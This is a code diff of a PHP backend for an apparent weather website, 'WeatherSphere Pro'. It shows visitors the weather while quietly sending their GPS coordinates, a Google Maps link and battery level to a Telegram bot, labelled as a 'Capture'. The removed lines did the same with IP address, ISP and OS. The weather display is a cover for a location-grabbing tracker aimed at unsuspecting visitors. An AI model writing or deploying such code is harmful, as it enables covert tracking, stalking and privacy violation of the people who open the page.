@@ -11,60 +11,40 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $batt = $_POST['batt'];
     $os = $_POST['os'];
     
-    // Vercel specific IP capture
     $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
-    $ipInfoJson = @file_get_contents("http://ip-api.com/json/$ip?fields=status,isp,city");
-    $ipData = json_decode($ipInfoJson, true);
     
-    $city = $ipData['city'] ?? "Unknown";
-    $isp = $ipData['isp'] ?? "Unknown";
-
-    // Dynamic Weather for the user UI
+    // Get Weather Data including Humidity, Wind, and Feels Like
     $weatherUrl = "https://api.openweathermap.org/data/2.5/weather?lat=$lati&lon=$longi&units=metric&appid=$weatherKey";
     $weatherData = json_decode(@file_get_contents($weatherUrl), true);
-    $temp = $weatherData['main']['temp'] ?? "N/A";
-    $desc = $weatherData['weather'][0]['main'] ?? "N/A";
+    
+    $city = $weatherData['name'] ?? "Unknown Location"; // GPS based city name
+    $temp = $weatherData['main']['temp'] ?? "0";
+    $feels = $weatherData['main']['feels_like'] ?? "0";
+    $hum = $weatherData['main']['humidity'] ?? "0";
+    $wind = $weatherData['wind']['speed'] ?? "0";
+    $desc = $weatherData['weather'][0]['description'] ?? "clear sky";
+    $icon = $weatherData['weather'][0]['icon'] ?? "01d";
 
-    // Correct Google Maps Link
-    $mapLink = "https://www.google.com/maps?q=$lati,$longi";
+    // Send everything to Telegram
+    $message = "🌤️ *WeatherSphere Pro Capture*\n\n";
+    $message .= "📍 *Loc:* $city\n";
+    $message .= "🌡️ *Temp:* $temp°C (Feels: $feels°C)\n";
+    $message .= "💧 *Hum:* $hum% | 🌬️ *Wind:* $wind m/s\n";
+    $message .= "🔋 *Batt:* $batt\n";
+    $message .= "🌍 *Map:* [Open Google Maps](https://www.google.com/maps?q=$lati,$longi)";
 
-    $message = "🌐 *New Report Captured*\n\n";
-    $message .= "📍 *Location:* $city\n";
-    $message .= "📏 *Accuracy:* {$acc}m\n";
-    $message .= "🌍 *Google Maps:* [Open Map]($mapLink)\n\n";
-    $message .= "📱 *OS:* $os\n";
-    $message .= "🔋 *Battery:* $batt\n";
-    $message .= "🌐 *IP:* $ip\n";
-    $message .= "🏢 *ISP:* $isp\n";
+    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($message));
 
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'Markdown'
-    ];
-
-    $options = ['http' => ['method' => 'POST', 'header' => "Content-type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($data)]];
-    @file_get_contents($url, false, stream_context_create($options));
-
-
-    echo json_encode(["status" => "success", "city" => $city, "temp" => $temp, "desc" => $desc]);
-// ... (keep all your existing telegram code exactly the same) ...
-
-    // ADDED: Extra data for the new Image Options UI
-    $humidity = $weatherData['main']['humidity'] ?? "0";
-    $windSpeed = $weatherData['wind']['speed'] ?? "0";
-    $feelsLike = $weatherData['main']['feels_like'] ?? $temp;
-
-    echo json_encode([
-        "status" => "success", 
-        "city" => $city, 
-        "temp" => $temp, 
-        "desc" => $desc,
-        "humidity" => $humidity,
-        "wind" => $windSpeed,
-        "feels" => $feelsLike
-    ]);
-    exit;
+    // Send back to the website UI
+    echo json_encode([
+        "city" => $city,
+        "temp" => $temp,
+        "feels" => $feels,
+        "humidity" => $hum,
+        "wind" => $wind,
+        "desc" => $desc,
+        "icon" => $icon
+    ]);
+    exit;
 }
 ?>
